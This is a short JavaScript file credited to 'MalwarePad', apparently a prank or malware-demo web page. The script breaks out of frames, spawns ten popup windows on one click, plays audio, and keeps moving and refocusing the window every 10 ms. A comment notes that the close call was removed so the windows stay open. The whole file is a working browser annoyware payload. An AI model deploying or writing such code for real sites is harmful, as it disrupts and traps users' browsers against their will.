/* Written by MalwarePad https://malwarepad.com */

if (top.location != location) {
  top.location.href = location.href;
}

function reopen() {
  window.open(
    "popup.html",
    "",
    "blankmenubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function init() {
  // Open 10 popups immediately on user click to avoid blocking
  for (let i = 0; i < 10; i++) {
    reopen();
  }

  // Show content and hide unlock button
  const unlockDiv = document.getElementById('unlock');
  const contentDiv = document.getElementById('content');
  if (unlockDiv && contentDiv) {
    unlockDiv.style.display = 'none';
    contentDiv.style.display = 'block';
  }

  // Play audio
  const audio = document.getElementById('audio');
  if (audio) {
    audio.play().catch(err => console.warn("Audio play blocked:", err));
  }

  // Start window movement and any animations here
  playBall();

  // Removed window.close() so windows stay open
}

var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100,
  flagRun = true;

function newXlt() {
  xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
  window.focus();
}

function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
  yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
}

function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;
  if (xPos > screen.width - 175) {
    newXlt();
  }
  if (xPos < 0) {
    newXrt();
  }
  if (yPos > screen.height - 100) {
    newYup();
  }
  if (yPos < 0) {
    newYdn();
  }
  if (flagRun) {
    window.moveTo(xPos, yPos);
    setTimeout(playBall, 10); // small delay for performance
  }
}
